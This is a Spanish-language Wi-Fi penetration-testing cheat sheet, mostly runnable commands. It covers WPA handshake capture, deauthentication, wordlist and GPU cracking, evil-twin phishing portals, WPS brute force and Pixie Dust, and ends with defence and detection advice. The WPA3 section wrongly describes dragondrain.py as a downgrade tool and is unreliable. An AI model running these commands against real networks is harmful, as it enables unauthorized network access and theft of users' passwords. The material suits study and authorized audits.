# Ataques WPA/WPA2

## Captura de Handshake

### **Método Pasivo (Esperar)**

```bash
# 1. Capturar en canal específico
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wpa_capture wlan0mon

# Esperar a que un cliente se conecte
# En la esquina superior derecha aparecerá:
# [ WPA handshake: 00:11:22:33:44:55

# Puede tomar horas si no hay actividad
```

---

### **Método Activo (Forzar Desconexión)**

```bash
# Terminal 1: Capturar
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wpa_capture wlan0mon

# Terminal 2: Ataque de desautenticación
sudo aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon

# Parámetros:
# -0    Deauth attack
# 10    Número de deauth packets (0 = continuo)
# -a    BSSID del AP

# Desautenticar cliente específico
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c CC:DD:EE:FF:00:11 wlan0mon
# -c    MAC del cliente

# El cliente se reconectará automáticamente
# Capturamos el handshake en ese momento
```

---

### **Verificar Handshake**

```bash
# Con aircrack-ng
sudo aircrack-ng wpa_capture-01.cap

# Si hay handshake válido, mostrará:
# 1 handshake

# Con pyrit
pyrit -r wpa_capture-01.cap analyze

# Con Wireshark
wireshark wpa_capture-01.cap
# Filtro: eapol
```

---

## Crackear WPA/WPA2

### **Método 1: Aircrack-ng + Wordlist**

```bash
# Crackeo básico
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap

# Con BSSID específico
sudo aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 wpa_capture-01.cap

# Aircrack-ng probará cada palabra de la wordlist
# Si encuentra la contraseña:
# KEY FOUND! [ password123 ]
```

---

### **Método 2: Hashcat (GPU - Más Rápido)**

```bash
# 1. Convertir .cap a .hccapx
# Instalar hcxtools
sudo apt install hcxtools

# Convertir
hcxpcapngtool -o hash.hc22000 wpa_capture-01.cap

# 2. Crackear con hashcat
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Con GPU es 100x más rápido que CPU

# Ver resultado
hashcat -m 22000 hash.hc22000 --show

# Velocidad aproximada:
# CPU: 1,000 - 10,000 passwords/seg
# GPU (RTX 3080): 500,000+ passwords/seg
```

---

### **Método 3: John the Ripper**

```bash
# Convertir .cap a formato John
sudo aircrack-ng wpa_capture-01.cap -J john_hash

# Crackear
john --wordlist=/usr/share/wordlists/rockyou.txt john_hash.hccap

# Ver resultado
john --show john_hash.hccap
```

---

### **Wordlists Recomendadas**

```bash
# RockYou (14 millones de passwords)
/usr/share/wordlists/rockyou.txt

# Descomprimir
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Wordlists especializadas para WiFi
# Crunch - Generar wordlists personalizadas
crunch 8 12 0123456789 -o numeros.txt
# 8-12 caracteres, solo números

crunch 8 8 -t passw@@@ -o custom.txt
# @ = minúsculas, , = mayúsculas, % = números, ^ = símbolos

# Descargar más wordlists
# SecLists
git clone https://github.com/danielmiessler/SecLists.git
```

---

## Evil Twin Attack

### **¿Qué es Evil Twin?**

```
Crear un AP falso con mismo SSID que el legítimo

Objetivo:
• Capturar credenciales
• MITM (Man-in-the-Middle)
• Phishing de contraseña WiFi

Flujo:
1. Desautenticar clientes del AP real
2. Clientes se conectan a nuestro AP falso
3. Portal cautivo pide "verificar" password
4. Usuario ingresa password real
5. Capturamos credencial
```

---

### **Herramientas para Evil Twin**

#### **Wifiphisher**

```bash
# Instalar
sudo apt install wifiphisher

# Ejecutar (automático)
sudo wifiphisher

# Seleccionar AP objetivo
# Wifiphisher crea AP falso y portal cautivo

# Modo manual
sudo wifiphisher -aI wlan0 -jI wlan1 -e "WiFi_Empresa" --force-hostapd

# Portal cautivo personalizado
sudo wifiphisher -aI wlan0 -jI wlan1 -e "WiFi_Empresa" -p firmware-upgrade
```

---

#### **Fluxion**

```bash
# Instalar
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
sudo ./fluxion.sh

# Pasos:
1. Seleccionar idioma
2. Seleccionar interfaz
3. Escanear redes
4. Seleccionar objetivo
5. Capturar handshake (opcional)
6. Lanzar Evil Twin + portal cautivo
7. Usuario ingresa password
8. Verificar password contra handshake
9. Si correcto, captura la clave
```

---

#### **Airgeddon**

```bash
# Instalar
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
sudo bash airgeddon.sh

# Características:
• Evil Twin con múltiples portales
• DoS attacks
• WPS attacks
• Handshake capture
• Interfaz tipo menú
```

---

### **Evil Twin Manual**

```bash
# 1. Crear AP falso con hostapd
# Crear hostapd.conf
cat > hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=WiFi_Empresa
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=12345678
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF

# 2. Configurar IP
sudo ifconfig wlan0 10.0.0.1 netmask 255.255.255.0

# 3. Iniciar hostapd
sudo hostapd hostapd.conf

# 4. DHCP server (dnsmasq)
sudo dnsmasq -C dnsmasq.conf -d

# 5. Portal cautivo con Apache/PHP
# (código del portal en /var/www/html)
```

---

## Ataque WPS

### **¿Qué es WPS?**

```
WiFi Protected Setup = Método "fácil" para conectarse

Métodos:
• PIN de 8 dígitos
• Push button
• NFC

Vulnerabilidad:
• PIN se valida en dos partes (4+4 dígitos)
• Solo 11,000 combinaciones posibles
• Se puede brute force en horas
```

---

### **Reaver - Ataque WPS PIN**

```bash
# 1. Detectar APs con WPS
sudo wash -i wlan0mon

# 2. Atacar con Reaver
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv

# Parámetros útiles:
# -vv       Verbose
# -d 5      Delay de 5 segundos entre intentos
# -N        No asociarse con AP
# -c 6      Canal

# Ataque completo
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv -d 2 -T 0.5 -N

# Puede tomar 4-10 horas
# Al final muestra:
# [+] WPS PIN: '12345670'
# [+] WPA PSK: 'password123'
```

---

### **Bully - Alternativa a Reaver**

```bash
# Instalar
sudo apt install bully

# Atacar
sudo bully wlan0mon -b 00:11:22:33:44:55 -c 6 -v 3

# Más rápido en algunos casos
```

---

### **Pixie Dust Attack (WPS)**

```bash
# Ataque offline para WPS con vulnerabilidad específica
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv -K

# -K    Pixie Dust attack

# Si el AP es vulnerable:
# WPS PIN encontrado en segundos (no horas)

# Con Bully
sudo bully wlan0mon -b 00:11:22:33:44:55 -d -v 3
```

---

## Ataques WPA3

### **Dragonblood**

```bash
# WPA3 tiene vulnerabilidades (Dragonblood)
# Requiere herramientas especializadas

# Instalar Dragonslayer
git clone https://github.com/vanhoefm/dragonslayer.git
cd dragonslayer

# Downgrade attack (WPA3 → WPA2)
sudo ./dragondrain.py wlan0mon

# Si exitoso, red cae a WPA2
# Luego atacar con métodos WPA2 tradicionales
```

---

## Defensa y Mejores Prácticas

### **Para Usuarios**

```
✅ Usar contraseñas fuertes (15+ caracteres)
   • Mezcla de mayúsculas, minúsculas, números, símbolos
   • No usar palabras de diccionario
   • Ejemplo: Tr0pic@l$unS3t#2024!

✅ Actualizar a WPA3 si es posible

✅ Deshabilitar WPS

✅ Cambiar password por defecto del router

✅ Actualizar firmware del router

✅ Usar VPN en redes públicas

✅ Verificar certificados (HTTPS)

✅ No confiar en redes abiertas
```

---

### **Para Administradores**

```
✅ Implementar WPA2-Enterprise (RADIUS)
   • 802.1X authentication
   • Certificados individuales

✅ Segmentación de red
   • Guest network separada
   • VLAN para diferentes grupos

✅ Monitoreo de intrusos
   • IDS/IPS wireless
   • Detección de Rogue APs

✅ MAC filtering (capa adicional)

✅ Ocultar SSID (security through obscurity)

✅ Reducir potencia de transmisión

✅ Auditorías periódicas

✅ Políticas de contraseñas

✅ Educación de usuarios
```

---

## Detección de Ataques

### **Detectar Evil Twin**

```
Señales de Evil Twin:
• Dos APs con mismo SSID pero diferente BSSID
• Señal inusualmente fuerte
• Portal cautivo inesperado
• Certificado SSL inválido
• Velocidad reducida

Herramientas de detección:
• Kismet (Rogue AP detection)
• Wireshark (análisis de tráfico)
• WiFi Analyzer apps
```

---

### **Detectar Deauth Attack**

```
Señales:
• Desconexiones frecuentes
• Muchos paquetes deauth en el aire

Contramedidas:
• 802.11w (Management Frame Protection)
• Alertas en logs
• IDS wireless
```

---

# Herramientas Adicionales

## WiFi Pumpkin

```bash
# Framework para Rogue AP

# Instalar
git clone https://github.com/P0cL4bs/wifipumpkin3.git
cd wifipumpkin3
sudo python3 setup.py install

# Ejecutar
sudo wifipumpkin3

# Características:
• Evil Twin
• Captive Portal
• MITM proxies
• Credential harvesting
• Plugin system
```

---

## Wireshark para WiFi

```bash
# Analizar capturas WiFi
wireshark wpa_capture-01.cap

# Filtros útiles:
wlan.fc.type_subtype == 0x08    # Beacon frames
wlan.fc.type_subtype == 0x00    # Association
eapol                            # Handshake packets
wlan.da == 00:11:22:33:44:55    # Destination MAC
```